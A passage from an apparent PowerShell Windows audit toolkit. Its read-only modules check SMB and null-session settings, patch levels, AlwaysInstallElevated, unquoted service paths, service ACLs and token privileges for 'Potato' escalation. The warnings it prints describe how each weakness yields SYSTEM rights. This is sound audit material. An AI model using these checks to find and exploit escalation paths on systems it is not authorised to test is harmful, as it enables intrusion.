        foreach ($name in @('EveryoneIncludesAnonymous', 'LimitBlankPasswordUse', 'RestrictAnonymous', 'RestrictAnonymousSAM')) {
            try {
                $value = (Get-ItemProperty -LiteralPath $lsaParams -Name $name -ErrorAction Stop).$name
                $values.Add([pscustomobject]@{ Scope = 'Lsa'; Name = $name; Value = [string]$value })
            }
            catch { }
        }
        try {
            $guest = @(Get-CimInstance -ClassName Win32_UserAccount -Filter 'LocalAccount=True' -ErrorAction Stop |
                Where-Object { [string]$_.SID -match '-501$' } |
                Select-Object -First 1)
            if ($guest.Count -gt 0) {
                $values.Add([pscustomobject]@{ Scope = 'Account'; Name = 'Guest'; Value = ('Disabled=' + [string]$guest[0].Disabled + '; Lockout=' + [string]$guest[0].Lockout) })
            }
            else { $values.Add([pscustomobject]@{ Scope = 'Account'; Name = 'Guest'; Value = 'the -501 account was not found' }) }
        }
        catch { $values.Add([pscustomobject]@{ Scope = 'Account'; Name = 'Guest'; Value = ('unavailable: ' + $_.Exception.Message) }) }
        return [pscustomobject]@{
            Values = @($values.ToArray())
            Notes  = @($notes.ToArray())
        }
    }
    $values = @($result.Values)
    foreach ($note in @($result.Notes)) { Write-ARInfo ([string]$note) }
    if ($values.Count -eq 0) {
        Write-ARInfo 'SMB configuration could not be read by either the cmdlets or the registry.'
        Set-ARStatus 'SMB audit: nothing found' 'Ok'
        return
    }
    Show-ARText ($values | Sort-Object Scope, Name | Format-Table Scope, Name, Value -AutoSize -Wrap)
    function Get-ARSmbValue {
        param($Rows, [string]$Scope, [string]$Name)
        foreach ($row in @($Rows)) {
            if ([string]$row.Scope -eq $Scope -and [string]$row.Name -eq $Name) { return [string]$row.Value }
        }
        return ''
    }
    $smb1 = Get-ARSmbValue -Rows $values -Scope 'SmbServerConfiguration' -Name 'EnableSMB1Protocol'
    if ($smb1 -eq '') { $smb1 = Get-ARSmbValue -Rows $values -Scope 'LanmanServer\Parameters' -Name 'SMB1' }
    $serverSigning = Get-ARSmbValue -Rows $values -Scope 'SmbServerConfiguration' -Name 'RequireSecuritySignature'
    if ($serverSigning -eq '') { $serverSigning = Get-ARSmbValue -Rows $values -Scope 'LanmanServer\Parameters' -Name 'RequireSecuritySignature' }
    $restrict = Get-ARSmbValue -Rows $values -Scope 'SmbServerConfiguration' -Name 'RestrictNullSessAccess'
    if ($restrict -eq '') { $restrict = Get-ARSmbValue -Rows $values -Scope 'LanmanServer\Parameters' -Name 'RestrictNullSessAccess' }
    $anonymous = Get-ARSmbValue -Rows $values -Scope 'Lsa' -Name 'EveryoneIncludesAnonymous'
    $nullShares = Get-ARSmbValue -Rows $values -Scope 'SmbServerConfiguration' -Name 'NullSessionShares'
    if ($nullShares -eq '') { $nullShares = Get-ARSmbValue -Rows $values -Scope 'LanmanServer\Parameters' -Name 'NullSessionShares' }
    $nullPipes = Get-ARSmbValue -Rows $values -Scope 'SmbServerConfiguration' -Name 'NullSessionPipes'
    if ($nullPipes -eq '') { $nullPipes = Get-ARSmbValue -Rows $values -Scope 'LanmanServer\Parameters' -Name 'NullSessionPipes' }
    Write-ARInfo ('SMB1 enabled: ' + $smb1 + '; SMB signing required: ' + $serverSigning + '; restricted null sessions: ' + $restrict + '; EveryoneIncludesAnonymous: ' + $anonymous)
    if ($smb1 -match '(?i)^(true|1)$') { Write-ARWarn 'SMB1 is enabled: legacy dialect and its exploit surface are exposed.' }
    if ($serverSigning -match '(?i)^(false|0)$') { Write-ARWarn 'SMB signing is not required: relay attacks against SMB are possible.' }
    if ($restrict -match '(?i)^(false|0)$' -or $anonymous -match '(?i)^(true|1)$') { Write-ARWarn 'Null sessions are not fully restricted: anonymous enumeration may work.' }
    if (-not [string]::IsNullOrWhiteSpace($nullShares)) { Write-ARWarn ('Null session shares configured: ' + $nullShares) }
    if (-not [string]::IsNullOrWhiteSpace($nullPipes)) { Write-ARWarn ('Null session pipes configured: ' + $nullPipes) }
    Write-ARInfo 'Read-only: SMB settings were only read.'
    Set-ARStatus 'SMB audit complete' 'Ok'
}

function Invoke-ARModulePatchAudit {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Patch audit'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 2000
        $updates = @(Get-CimInstance -ClassName Win32_QuickFixEngineering -ErrorAction Stop | Select-Object -First ($cap + 1))
        $truncated = $false
        if ($updates.Count -gt $cap) { $updates = @($updates | Select-Object -First $cap); $truncated = $true }
        $rows = New-Object System.Collections.Generic.List[object]
        $newest = $null
        $parseFailures = 0
        foreach ($update in $updates) {
            $hotfix = [string]$update.HotFixID
            $installedText = ''
            try { $installedText = [string]$update.InstalledOn } catch { }
            $installedDate = $null
            if (-not [string]::IsNullOrWhiteSpace($installedText)) {
                foreach ($format in @('M/d/yyyy', 'MM/dd/yyyy', 'yyyy-MM-dd', 'yyyyMMdd', 'd/M/yyyy', 'dd/MM/yyyy', 'M/d/yy', 'MM/dd/yy')) {
                    try { $installedDate = [datetime]::ParseExact($installedText, $format, [System.Globalization.CultureInfo]::InvariantCulture); break } catch { }
                }
                if ($null -eq $installedDate) {
                    try { $installedDate = [datetime]::Parse($installedText, [System.Globalization.CultureInfo]::InvariantCulture) } catch { $parseFailures++ }
                }
            }
            if ($null -ne $installedDate -and ($null -eq $newest -or $installedDate -gt $newest)) { $newest = $installedDate }
            $category = 'Other'
            if ($hotfix -match '(?i)^KB(4012212|4012213|4012214|4012215|4012216|4012217|4012598|4551762|4560960)$') { $category = 'SMB' }
            elseif ($hotfix -match '(?i)^KB(4499175|4500331)$') { $category = 'RDP' }
            elseif ($hotfix -match '(?i)^KB(5004945|5004953|5004954|5004955|5004956|5004959|5003637|5001330|4601319)$') { $category = 'Privilege escalation' }
            $rows.Add([pscustomobject]@{
                HotFix      = $hotfix
                Category    = $category
                Installed   = $installedText
                Description = [string]$update.Description
            })
        }
        $newestText = ''
        if ($null -ne $newest) { $newestText = $newest.ToString('yyyy-MM-dd') }
        return [pscustomobject]@{
            Rows          = @($rows.ToArray())
            Newest        = $newestText
            ParseFailures = $parseFailures
            Truncated     = $truncated
        }
    }
    $rows = @($result.Rows)
    if ([bool]$result.Truncated) { Write-ARWarn 'Hotfix list capped at 2000 entries.' }
    if ($rows.Count -eq 0) {
        Write-ARInfo 'Win32_QuickFixEngineering returned no hotfix.'
        Set-ARStatus 'Patch audit: nothing found' 'Ok'
        return
    }
    Write-ARInfo ('Hotfixes: ' + [string]$rows.Count + '; newest installed: ' + [string]$result.Newest + '; unparsed dates: ' + [string]$result.ParseFailures + '.')
    foreach ($group in @($rows | Group-Object Category | Sort-Object Name)) {
        Write-ARInfo ('  ' + [string]$group.Name + ': ' + [string]$group.Count)
    }
    $interesting = @($rows | Where-Object { $_.Category -ne 'Other' } | Sort-Object Category, HotFix)
    if ($interesting.Count -gt 0) {
        Show-ARText ($interesting | Format-Table HotFix, Category, Installed, Description -AutoSize -Wrap)
    }
    else { Write-ARInfo 'No landmark SMB, RDP or privilege-escalation update is present.' }
    $other = @($rows | Where-Object { $_.Category -eq 'Other' })
    if ($other.Count -gt 0) { Write-ARInfo ('Other updates: ' + [string]$other.Count + ' (not printed; the category map only covers landmark KBs).') }
    Write-ARInfo 'Read-only: the update inventory was only read.'
    Set-ARStatus 'Patch audit complete' 'Ok'
}

function Invoke-ARModuleAlwaysInstallElevated {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'AlwaysInstallElevated policy check'
    $session = Get-ARTargetSession
    $relativePaths = @(
        'SOFTWARE\Policies\Microsoft\Windows\Installer',
        'SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\Installer'
    )
    $result = Invoke-ARRemote -Session $session -ArgumentList (, $relativePaths) -ScriptBlock {
        param($paths)
        $rows = New-Object System.Collections.Generic.List[object]
        $hives = @(
            @('HKLM', [Microsoft.Win32.Registry]::LocalMachine),
            @('HKCU', [Microsoft.Win32.Registry]::CurrentUser)
        )
        foreach ($hive in $hives) {
            foreach ($relative in $paths) {
                $key = $null
                try { $key = $hive[1].OpenSubKey([string]$relative) } catch { }
                $raw = $null
                if ($null -ne $key) {
                    try { $raw = $key.GetValue('AlwaysInstallElevated', $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames) }
                    catch { }
                    $key.Close()
                }
                $state = 'not set'
                if ($null -ne $raw) {
                    if ([string]$raw -eq '1') { $state = 'enabled' }
                    else { $state = ('set to ' + [string]$raw) }
                }
                $rows.Add([pscustomobject]@{
                    Hive  = [string]$hive[0]
                    Path  = ([string]$hive[0] + '\' + [string]$relative)
                    Value = $state
                    On    = ($state -eq 'enabled')
                })
            }
        }
        $machineOn = $false
        $userOn = $false
        foreach ($row in $rows) {
            if (-not $row.On) { continue }
            if ($row.Hive -eq 'HKLM') { $machineOn = $true }
            else { $userOn = $true }
        }
        return [pscustomobject]@{
            Rows      = @($rows.ToArray())
            MachineOn = $machineOn
            UserOn    = $userOn
        }
    }
    $rows = @($result.Rows)
    Show-ARText ($rows | Format-Table Hive, Value, Path -AutoSize -Wrap)
    $exploitable = ([bool]$result.MachineOn -and [bool]$result.UserOn)
    if ($exploitable) {
        Write-ARWarn 'AlwaysInstallElevated is enabled in both HKLM and HKCU: an MSI run by this account installs with SYSTEM rights.'
        Write-ARInfo 'Any signed or unsigned MSI becomes a privilege-escalation path; the policy applies to the whole machine, not just this user.'
    }
    elseif ([bool]$result.MachineOn -or [bool]$result.UserOn) {
        $missing = 'HKCU'
        if (-not [bool]$result.MachineOn) { $missing = 'HKLM' }
        Write-ARInfo ('The policy is only half set: ' + $missing + ' is not enabled, so Windows ignores it and an MSI installs with the caller token.')
    }
    else { Write-ARInfo 'AlwaysInstallElevated is not configured: an MSI installs with the caller token.' }
    Write-ARInfo 'Read-only: both policy keys were read, never written.'
    Set-ARStatus 'AlwaysInstallElevated checked' 'Ok'
}

function Invoke-ARModuleUnquotedServicePath {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Unquoted service path check'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 2000
        $directoryCap = 300
        $candidateCap = 12
        $rows = New-Object System.Collections.Generic.List[object]
        $truncated = New-Object System.Collections.Generic.List[string]

        function Test-ARBroadWriteAcl {
            param([string]$Directory)
            try {
                $acl = Get-Acl -LiteralPath $Directory -ErrorAction Stop
                foreach ($rule in @($acl.Access | Select-Object -First 512)) {
                    if ($rule.AccessControlType -ne 'Allow') { continue }
                    $identity = [string]$rule.IdentityReference
                    if ($identity -notmatch '(?i)^(Everyone|BUILTIN\\Users|NT AUTHORITY\\Authenticated Users|S-1-1-0|S-1-5-32-545|S-1-5-11)$') { continue }
                    if ([string]$rule.FileSystemRights -match '(?i)(Write|Modify|FullControl|CreateFiles|AppendData)') { return $true }
                }
                return $false
            }
            catch { return $false }
        }

        # Get-Acl over some system directories fails with access denied even for an
        # administrator (C:\Windows\Temp is the measured case), so the classic
        # writable locations answer for themselves instead of failing the action.
        $knownWritable = New-Object System.Collections.Generic.List[string]
        foreach ($known in @(
                ($env:SystemRoot + '\Temp'),
                ($env:SystemDrive + '\Temp'),
                ($env:SystemDrive + '\Users\Public'),
                $env:ProgramData)) {
            $normalized = ([Environment]::ExpandEnvironmentVariables([string]$known)).TrimEnd('\')
            if ($normalized -ne '' -and -not $knownWritable.Contains($normalized.ToLowerInvariant())) { $knownWritable.Add($normalized.ToLowerInvariant()) }
        }

        $directoryCache = @{}
        $directoriesChecked = 0
        $directoriesTruncated = $false
        $rowsTruncated = $false
        $services = @(Get-CimInstance -ClassName Win32_Service -ErrorAction Stop | Select-Object -First ($cap + 1))
        if ($services.Count -gt $cap) { $services = @($services | Select-Object -First $cap); $truncated.Add('services') }
        foreach ($service in $services) {
            if ($rowsTruncated) { break }
            $pathName = [string]$service.PathName
            if ([string]::IsNullOrWhiteSpace($pathName)) { continue }
            # Several binaries can share one ImagePath; the SCM only resolves the first.
            $text = ([string]($pathName.Trim() -split ',')[0]).Trim()
            if ($text.StartsWith('"')) { continue }
            if ($text -notmatch '\s') { continue }
            # A first token that already ends in .exe resolves whole: nothing to hijack.
            if ($text -match '^(?i)[^\s]+\.exe(\s|$)') { continue }
            $segments = @($text -split '\s+' | Where-Object { $_ -ne '' })
            if ($segments.Count -lt 2) { continue }
            $candidates = New-Object System.Collections.Generic.List[string]
            for ($index = 1; $index -le $segments.Count; $index++) {
                $prefix = (@($segments[0..($index - 1)]) -join ' ')
                if ($prefix -match '(?i)\.exe$') { break }
                $candidate = $prefix + '.exe'
                if (-not $candidates.Contains($candidate)) { $candidates.Add($candidate) }
                if ($candidates.Count -ge $candidateCap) { break }
            }
            foreach ($candidate in $candidates) {
                $directory = ''
                try { $directory = [System.IO.Path]::GetDirectoryName($candidate) } catch { $directory = '' }
                $exists = $false
                try { $exists = Test-Path -LiteralPath $candidate -PathType Leaf } catch { $exists = $false }
                $writable = $false
                if (-not [string]::IsNullOrWhiteSpace($directory)) {
                    $normalized = $directory.TrimEnd('\')
                    $cacheKey = $normalized.ToLowerInvariant()
                    if ($directoryCache.ContainsKey($cacheKey)) { $writable = [bool]$directoryCache[$cacheKey] }
                    elseif ($directoriesChecked -ge $directoryCap) { $directoriesTruncated = $true }
                    else {
                        $directoriesChecked++
                        if (-not (Test-Path -LiteralPath $normalized)) { $writable = $false }
                        elseif (Test-ARBroadWriteAcl -Directory $normalized) { $writable = $true }
                        elseif ($knownWritable.Contains($cacheKey)) { $writable = $true }
                        $directoryCache[$cacheKey] = $writable
                    }
                }
                $rows.Add([pscustomobject]@{
                    Service     = [string]$service.Name
                    Account     = [string]$service.StartName
                    Candidate   = $candidate
                    Directory   = $directory
                    WritableDir = $writable
                    FileExists  = $exists
                    Path        = $pathName
                })
                if ($rows.Count -ge $cap) { $rowsTruncated = $true; $truncated.Add('candidates'); break }
            }
        }
        if ($directoriesTruncated) { $truncated.Add('directory ACL checks (first 300 unique directories only)') }
        return [pscustomobject]@{
            Rows      = @($rows.ToArray())
            Truncated = @($truncated.ToArray())
        }
    }
    $rows = @($result.Rows)
    foreach ($item in @($result.Truncated)) { Write-ARWarn ('Collection capped: ' + [string]$item) }
    if ($rows.Count -eq 0) {
        Write-ARInfo 'No service has an unquoted ImagePath containing a space: there is no path hijack to make.'
        Set-ARStatus 'Unquoted service paths: nothing found' 'Ok'
        return
    }
    $writable = @($rows | Where-Object { $_.WritableDir })
    $present = @($rows | Where-Object { $_.FileExists })
    $flagged = @($rows | Where-Object { $_.WritableDir -or $_.FileExists } | Sort-Object Service, Candidate)
    Write-ARInfo ('Unquoted paths: ' + [string](@($rows | Select-Object -ExpandProperty Service -Unique).Count) + ' service(s), ' + [string]$rows.Count + ' candidate binary(ies); writable directories: ' + [string]$writable.Count + '; candidate already on disk: ' + [string]$present.Count + '.')
    if ($flagged.Count -gt 0) {
        $preview = @($flagged | Select-Object -First 200)
        Show-ARText ($preview | Format-Table Service, Candidate, WritableDir, FileExists, Account -AutoSize -Wrap)
        if ($flagged.Count -gt $preview.Count) { Write-ARInfo ('Only the first 200 of ' + [string]$flagged.Count + ' exploitable candidates are printed.') }
        Write-ARWarn 'A writable directory above the real binary lets the current user drop the missing .exe and inherit the service account on restart.'
        Write-ARWarn 'A candidate already on disk is a staged hijack: check its signature and creation time before trusting it.'
    }
    else {
        $plain = @($rows | Sort-Object Service, Candidate | Select-Object -First 60)
        Show-ARText ($plain | Format-Table Service, Candidate, WritableDir, Directory -AutoSize -Wrap)
        Write-ARInfo 'No candidate directory allows broad writes and no candidate file exists, so the unquoted paths are cosmetic here.'
    }
    Write-ARInfo 'Read-only: service configuration and directory ACLs were read, nothing was written.'
    Set-ARStatus 'Unquoted service paths checked' 'Ok'
}

function Invoke-ARModuleServicePermissions {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Service permission check'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $cap = 2000
        $scCap = 100
        $rows = New-Object System.Collections.Generic.List[object]
        $notes = New-Object System.Collections.Generic.List[string]

        function ConvertFrom-ARSddlRights {
            param([string]$Rights)
            $mask = [int64]0
            $unknown = New-Object System.Collections.Generic.List[string]
            $text = ([string]$Rights).Trim().ToUpperInvariant()
            $index = 0
            while ($index + 1 -lt $text.Length) {
                $token = $text.Substring($index, 2)
                $index += 2
                switch ($token) {
                    'CC' { $mask = $mask -bor [int64]1 }
                    'DC' { $mask = $mask -bor [int64]2 }
                    'LC' { $mask = $mask -bor [int64]4 }
                    'SW' { $mask = $mask -bor [int64]8 }
                    'RP' { $mask = $mask -bor [int64]16 }
                    'WP' { $mask = $mask -bor [int64]32 }
                    'DT' { $mask = $mask -bor [int64]64 }
                    'LO' { $mask = $mask -bor [int64]128 }
                    'CR' { $mask = $mask -bor [int64]256 }
                    'SD' { $mask = $mask -bor [int64]65536 }
                    'RC' { $mask = $mask -bor [int64]131072 }
                    'WD' { $mask = $mask -bor [int64]262144 }
                    'WO' { $mask = $mask -bor [int64]524288 }
                    'GA' { $mask = $mask -bor [int64]268435456 }
                    'GX' { $mask = $mask -bor [int64]536870912 }
                    'GW' { $mask = $mask -bor [int64]1073741824 }
                    'GR' { $mask = $mask -bor [int64]2147483648 }
                    'FA' { $mask = $mask -bor [int64]983551 }
                    default { $unknown.Add($token) }
                }
            }
            return [pscustomobject]@{ Mask = $mask; Unknown = @($unknown.ToArray()) }
        }

        function Get-ARServiceRightNames {
            param([int64]$Mask)
            if (($Mask -band [int64]268435456) -ne 0) { return 'GENERIC_ALL' }
            $names = New-Object System.Collections.Generic.List[string]
            $map = @(
                @('QUERY_CONFIG', [int64]1),
                @('CHANGE_CONFIG', [int64]2),
                @('QUERY_STATUS', [int64]4),
                @('ENUMERATE_DEPENDENTS', [int64]8),
                @('START', [int64]16),
                @('STOP', [int64]32),
                @('PAUSE_CONTINUE', [int64]64),
                @('INTERROGATE', [int64]128),
                @('USER_DEFINED_CONTROL', [int64]256),
                @('DELETE', [int64]65536),
                @('READ_CONTROL', [int64]131072),
                @('WRITE_DAC', [int64]262144),
                @('WRITE_OWNER', [int64]524288)
            )
            foreach ($entry in $map) {
                if (($Mask -band [int64]$entry[1]) -ne 0) { $names.Add([string]$entry[0]) }
            }
            if (($Mask -band [int64]1073741824) -ne 0) { $names.Add('GENERIC_WRITE') }
            if (($Mask -band [int64]536870912) -ne 0) { $names.Add('GENERIC_EXECUTE') }
            if (($Mask -band [int64]2147483648) -ne 0) { $names.Add('GENERIC_READ') }
            if ($names.Count -eq 0) { return 'none' }
            return ($names -join '|')
        }

        $broadAliases = @('WD', 'BU', 'AU', 'IU', 'SU', 'CO', 'AN', 'BG', 'LS', 'NS')
        $broadSids = @('S-1-1-0', 'S-1-5-11', 'S-1-5-4', 'S-1-5-7', 'S-1-5-6', 'S-1-5-32-545', 'S-1-5-32-546')
        $aliasNames = @{
            'WD' = 'Everyone'
            'BU' = 'BUILTIN\Users'
            'AU' = 'NT AUTHORITY\Authenticated Users'
            'IU' = 'NT AUTHORITY\INTERACTIVE'
            'SU' = 'NT AUTHORITY\SERVICE'
            'CO' = 'CREATOR OWNER'
            'AN' = 'NT AUTHORITY\ANONYMOUS LOGON'
            'BG' = 'BUILTIN\Guests'
            'LS' = 'NT AUTHORITY\LOCAL SERVICE'
            'NS' = 'NT AUTHORITY\NETWORK SERVICE'
        }

        $services = @(Get-CimInstance -ClassName Win32_Service -ErrorAction Stop | Select-Object -First ($cap + 1))
        if ($services.Count -gt $cap) { $services = @($services | Select-Object -First $cap) }
        $unquoted = New-Object System.Collections.Generic.List[string]
        foreach ($service in $services) {
            $pathName = [string]$service.PathName
            if ([string]::IsNullOrWhiteSpace($pathName)) { continue }
            $text = ([string]($pathName.Trim() -split ',')[0]).Trim()
            if ($text.StartsWith('"')) { continue }
            if ($text -notmatch '\s') { continue }
            if ($text -match '^(?i)[^\s]+\.exe(\s|$)') { continue }
            $unquoted.Add([string]$service.Name)
        }
        $candidates = @($unquoted.ToArray())
        $scope = 'services with an unquoted path'
        if ($candidates.Count -eq 0) {
            $scope = 'the first 40 services (none has an unquoted path)'
            $candidates = @($services | Select-Object -First 40 | ForEach-Object { [string]$_.Name })
        }
        if ($candidates.Count -gt $scCap) {
            $notes.Add('sc sdshow capped at 100 services (' + [string]$candidates.Count + ' were in scope)')
            $candidates = @($candidates | Select-Object -First $scCap)
        }
        foreach ($name in $candidates) {
            $sddl = ''
            $exitCode = 0
            try {
                $sddl = [string](& sc.exe sdshow $name 2>&1 | Out-String)
                $exitCode = $LASTEXITCODE
            }
            catch {
                $notes.Add([string]$name + ': sc sdshow failed (' + $_.Exception.Message + ')')
                continue
            }
            if ($exitCode -ne 0 -or $sddl -notmatch 'D:') {
                $notes.Add([string]$name + ': sc sdshow returned no SDDL (exit ' + [string]$exitCode + ')')
                continue
            }
            # Indexing a one-line result would yield a char, not a string.
            $sddlLines = @(@($sddl -split "`r?`n") | Where-Object { $_ -match 'D:' })
            if ($sddlLines.Count -gt 0) { $sddl = ([string]$sddlLines[0]).Trim() }
            $allow = @{}
            $deny = @{}
            $label = @{}
            foreach ($match in [regex]::Matches($sddl, '\(([^)]*)\)')) {
                $fields = $match.Groups[1].Value -split ';'
                if ($fields.Count -lt 6) { continue }
                $type = ([string]$fields[0]).Trim().ToUpperInvariant()
                if ($type -ne 'A' -and $type -ne 'D') { continue }
                $flags = ([string]$fields[1]).Trim().ToUpperInvariant()
                # Inherit-only ACEs do not apply to the object itself.
                if ($flags.Contains('IO') -or $flags.Contains('ID')) { continue }
                $sid = ([string]$fields[5]).Trim()
                if ([string]::IsNullOrWhiteSpace($sid)) { continue }
                $key = $sid.ToUpperInvariant()
                $broad = $false
                if ($broadAliases -contains $key) { $broad = $true }
                if ($broadSids -contains $key) { $broad = $true }
                if (-not $broad) { continue }
                $decoded = ConvertFrom-ARSddlRights -Rights ([string]$fields[2])
                foreach ($token in @($decoded.Unknown)) { $notes.Add([string]$name + ': unknown SDDL right "' + [string]$token + '"') }
                if ($type -eq 'A') {
                    if ($allow.ContainsKey($key)) { $allow[$key] = [int64]$allow[$key] -bor [int64]$decoded.Mask }
                    else { $allow[$key] = [int64]$decoded.Mask }
                    if (-not $label.ContainsKey($key)) {
                        $display = $sid
                        if ($aliasNames.ContainsKey($key)) { $display = [string]$aliasNames[$key] }
                        else {
                            try { $display = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount]).Value }
                            catch { $display = $sid }
                        }
                        $label[$key] = $display
                    }
                }
                else {
                    if ($deny.ContainsKey($key)) { $deny[$key] = [int64]$deny[$key] -bor [int64]$decoded.Mask }
                    else { $deny[$key] = [int64]$decoded.Mask }
                }
            }
            foreach ($key in @($allow.Keys)) {
                $effective = [int64]$allow[$key]
                if ($deny.ContainsKey($key)) { $effective = $effective -band (-bnot [int64]$deny[$key]) }
                if ($effective -eq 0) { continue }
                $reconfigure = $false
                if (($effective -band [int64]2) -ne 0) { $reconfigure = $true }
                if (($effective -band [int64]262144) -ne 0) { $reconfigure = $true }
                if (($effective -band [int64]524288) -ne 0) { $reconfigure = $true }
                if (($effective -band [int64]1073741824) -ne 0) { $reconfigure = $true }
                if (($effective -band [int64]268435456) -ne 0) { $reconfigure = $true }
                $rows.Add([pscustomobject]@{
                    Service     = [string]$name
                    Principal   = [string]$label[$key]
                    Access      = (Get-ARServiceRightNames -Mask $effective)
                    Reconfigure = $reconfigure
                    Start       = (($effective -band [int64]16) -ne 0)
                    Stop        = (($effective -band [int64]32) -ne 0)
                    Delete      = (($effective -band [int64]65536) -ne 0)
                })
            }
        }
        return [pscustomobject]@{
            Rows  = @($rows.ToArray())
            Scope = $scope
            Notes = @($notes.ToArray())
        }
    }
    $rows = @($result.Rows)
    foreach ($note in @($result.Notes | Select-Object -First 40)) { Write-ARInfo ([string]$note) }
    Write-ARInfo ('Scope: ' + [string]$result.Scope + '.')
    if ($rows.Count -eq 0) {
        Write-ARInfo 'No non-admin principal holds an explicit allowance on the services in scope.'
        Set-ARStatus 'Service permissions: nothing flagged' 'Ok'
        return
    }
    $flagged = @($rows | Where-Object { $_.Reconfigure } | Sort-Object Service, Principal)
    $restart = @($rows | Where-Object { -not $_.Reconfigure -and ($_.Start -or $_.Stop) } | Sort-Object Service, Principal)
    if ($flagged.Count -gt 0) {
        $preview = @($flagged | Select-Object -First 200)
        Show-ARText ($preview | Format-Table Service, Principal, Access, Reconfigure -AutoSize -Wrap)
        if ($flagged.Count -gt $preview.Count) { Write-ARInfo ('Only the first 200 of ' + [string]$flagged.Count + ' reconfigurable grants are printed.') }
        Write-ARWarn 'CHANGE_CONFIG, WRITE_DAC or WRITE_OWNER for a non-admin principal turns the service into a SYSTEM execution path: change the binary and restart it.'
        foreach ($owner in @($flagged | Where-Object { $_.Access -match 'GENERIC_ALL' } | Select-Object -First 10)) {
            Write-ARWarn ([string]$owner.Service + ' grants GENERIC_ALL to ' + [string]$owner.Principal + '.')
        }
        foreach ($item in @($flagged | Where-Object { $_.Delete } | Select-Object -First 10)) {
            Write-ARInfo ([string]$item.Service + ' also grants DELETE to ' + [string]$item.Principal + '.')
        }
    }
    else { Write-ARInfo 'No non-admin principal can reconfigure the services in scope.' }
    if ($restart.Count -gt 0) {
        Show-ARText (@($restart | Select-Object -First 40) | Format-Table Service, Principal, Access -AutoSize -Wrap)
        Write-ARInfo ('Start/stop only grants: ' + [string]$restart.Count + ' (denial of service, not escalation).')
    }
    Write-ARInfo 'Read-only: sdshow only reads the security descriptor of each service.'
    Set-ARStatus 'Service permissions checked' 'Ok'
}

function Invoke-ARModulePotatoCheck {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Potato viability check'
    $session = Get-ARTargetSession
    $result = Invoke-ARRemote -Session $session -ScriptBlock {
        $source = @'
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

public static class ARTokenPrivileges
{
    [StructLayout(LayoutKind.Sequential)]
    private struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential)]
    private struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetTokenInformation(IntPtr token, int infoClass, IntPtr buffer, int length, out int returned);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool LookupPrivilegeName(string system, ref LUID luid, StringBuilder name, ref int length);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr process, uint access, out IntPtr token);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    public static string[] Held()
    {
        var result = new List<string>();
        IntPtr token = IntPtr.Zero;
        if (!OpenProcessToken(GetCurrentProcess(), 0x0008, out token))
        {
            result.Add("!OpenProcessToken:" + Marshal.GetLastWin32Error().ToString());
            return result.ToArray();
        }
        try
        {
            int size = 0;
            GetTokenInformation(token, 3, IntPtr.Zero, 0, out size);
            if (size <= 0) { result.Add("!GetTokenInformation:" + Marshal.GetLastWin32Error().ToString()); return result.ToArray(); }
            IntPtr buffer = Marshal.AllocHGlobal(size);
            try
            {
                if (!GetTokenInformation(token, 3, buffer, size, out size))
                {
                    result.Add("!GetTokenInformation:" + Marshal.GetLastWin32Error().ToString());
                    return result.ToArray();
                }
                int count = Marshal.ReadInt32(buffer);
                int offset = 4;
                int itemSize = Marshal.SizeOf(typeof(LUID_AND_ATTRIBUTES));
                for (int i = 0; i < count; i++)
                {
                    object boxed = Marshal.PtrToStructure(new IntPtr(buffer.ToInt64() + offset), typeof(LUID_AND_ATTRIBUTES));
                    LUID_AND_ATTRIBUTES item = (LUID_AND_ATTRIBUTES)boxed;
                    var name = new StringBuilder(256);
                    int length = 256;
                    if (LookupPrivilegeName(null, ref item.Luid, name, ref length))
                    {
                        bool enabled = (item.Attributes & 0x2) != 0;
                        result.Add(name.ToString() + "|" + (enabled ? "1" : "0"));
                    }
                    offset += itemSize;
                }
            }
            finally { Marshal.FreeHGlobal(buffer); }
        }
        finally { CloseHandle(token); }
        return result.ToArray();
    }
}
'@
        if ($null -eq ('ARTokenPrivileges' -as [type])) {
            Add-Type -TypeDefinition $source -Language CSharp -ErrorAction Stop
        }
        $privileges = @([ARTokenPrivileges]::Held())
        $current = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $isSystem = $false
        $isAdmin = $false
        try { $isSystem = $current.User.IsWellKnown([System.Security.Principal.WellKnownSidType]::LocalSystemSid) } catch { }
        try { $isAdmin = (New-Object System.Security.Principal.WindowsPrincipal($current)).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator) } catch { }
        $os = $null
        try { $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction Stop } catch { }
        $build = 0
        $caption = ''
        $version = [string][System.Environment]::OSVersion.Version
        if ($null -ne $os) {
            [void][int]::TryParse([string]$os.BuildNumber, [ref]$build)
            $caption = [string]$os.Caption
            $version = [string]$os.Version
        }
        if ($build -le 0) { $build = [System.Environment]::OSVersion.Version.Build }
        return [pscustomobject]@{
            Identity   = [string]$current.Name
            IsSystem   = [bool]$isSystem
            IsAdmin    = [bool]$isAdmin
            Build      = [int]$build
            Caption    = $caption
            Version    = $version
            Privileges = @($privileges)
        }
    }
    $privileges = @($result.Privileges)
    $held = @{}
    foreach ($line in $privileges) {
        $text = [string]$line
